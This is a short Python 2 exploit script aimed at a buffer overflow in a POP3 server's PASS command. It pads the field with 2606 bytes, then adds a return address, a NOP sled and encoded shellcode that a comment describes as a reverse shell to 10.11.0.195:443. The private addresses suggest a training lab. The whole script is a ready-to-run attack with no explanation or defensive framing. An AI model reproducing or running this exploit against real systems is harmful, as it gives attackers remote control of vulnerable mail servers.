#!/usr/bin/python

import socket

buffer = []
counter = 100
# Reverse shell to 10.11.0.195:443, encoded with shikata_ga_nai,
# avoid using \x00, \x0a, \x0da, exit thread instead of process
shellcode =  ""
shellcode += "\xd9\xc3\xba\xbd\xa5\x4c\x1c\xd9\x74\x24\xf4\x5e"
shellcode += "\x33\xc9\xb1\x52\x83\xee\xfc\x31\x56\x13\x03\xeb"
shellcode += "\xb6\xae\xe9\xef\x51\xac\x12\x0f\xa2\xd1\x9b\xea"
shellcode += "\x93\xd1\xf8\x7f\x83\xe1\x8b\x2d\x28\x89\xde\xc5"
shellcode += "\xbb\xff\xf6\xea\x0c\xb5\x20\xc5\x8d\xe6\x11\x44"
shellcode += "\x0e\xf5\x45\xa6\x2f\x36\x98\xa7\x68\x2b\x51\xf5"
shellcode += "\x21\x27\xc4\xe9\x46\x7d\xd5\x82\x15\x93\x5d\x77"
shellcode += "\xed\x92\x4c\x26\x65\xcd\x4e\xc9\xaa\x65\xc7\xd1"
shellcode += "\xaf\x40\x91\x6a\x1b\x3e\x20\xba\x55\xbf\x8f\x83"
shellcode += "\x59\x32\xd1\xc4\x5e\xad\xa4\x3c\x9d\x50\xbf\xfb"
shellcode += "\xdf\x8e\x4a\x1f\x47\x44\xec\xfb\x79\x89\x6b\x88"
shellcode += "\x76\x66\xff\xd6\x9a\x79\x2c\x6d\xa6\xf2\xd3\xa1"
shellcode += "\x2e\x40\xf0\x65\x6a\x12\x99\x3c\xd6\xf5\xa6\x5e"
shellcode += "\xb9\xaa\x02\x15\x54\xbe\x3e\x74\x31\x73\x73\x86"
shellcode += "\xc1\x1b\x04\xf5\xf3\x84\xbe\x91\xbf\x4d\x19\x66"
shellcode += "\xbf\x67\xdd\xf8\x3e\x88\x1e\xd1\x84\xdc\x4e\x49"
shellcode += "\x2c\x5d\x05\x89\xd1\x88\x8a\xd9\x7d\x63\x6b\x89"
shellcode += "\x3d\xd3\x03\xc3\xb1\x0c\x33\xec\x1b\x25\xde\x17"
shellcode += "\xcc\x40\x14\x17\xcf\x3d\x28\x17\xce\x06\xa5\xf1"
shellcode += "\xba\x68\xe0\xaa\x52\x10\xa9\x20\xc2\xdd\x67\x4d"
shellcode += "\xc4\x56\x84\xb2\x8b\x9e\xe1\xa0\x7c\x6f\xbc\x9a"
shellcode += "\x2b\x70\x6a\xb2\xb0\xe3\xf1\x42\xbe\x1f\xae\x15"
shellcode += "\x97\xee\xa7\xf3\x05\x48\x1e\xe1\xd7\x0c\x59\xa1"
shellcode += "\x03\xed\x64\x28\xc1\x49\x43\x3a\x1f\x51\xcf\x6e"
shellcode += "\xcf\x04\x99\xd8\xa9\xfe\x6b\xb2\x63\xac\x25\x52"
shellcode += "\xf5\x9e\xf5\x24\xfa\xca\x83\xc8\x4b\xa3\xd5\xf7"
shellcode += "\x64\x23\xd2\x80\x98\xd3\x1d\x5b\x19\xf3\xff\x49"
shellcode += "\x54\x9c\x59\x18\xd5\xc1\x59\xf7\x1a\xfc\xd9\xfd"
shellcode += "\xe2\xfb\xc2\x74\xe6\x40\x45\x65\x9a\xd9\x20\x89"
shellcode += "\x09\xd9\x60"

while len(buffer) <= 30:
    buffer.append("A" * 2606 + "\x8f\x35\x4a\x5f" + "\x90" * 8 + shellcode)
print "Sending payload..."
for string in buffer:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect = sock.connect(("10.11.15.76", 110))
        sock.send("USER test\r\n")
        sock.send("PASS " + string + "\r\n")
        sock.send("QUIT\r\n")
    finally:
        sock.close()
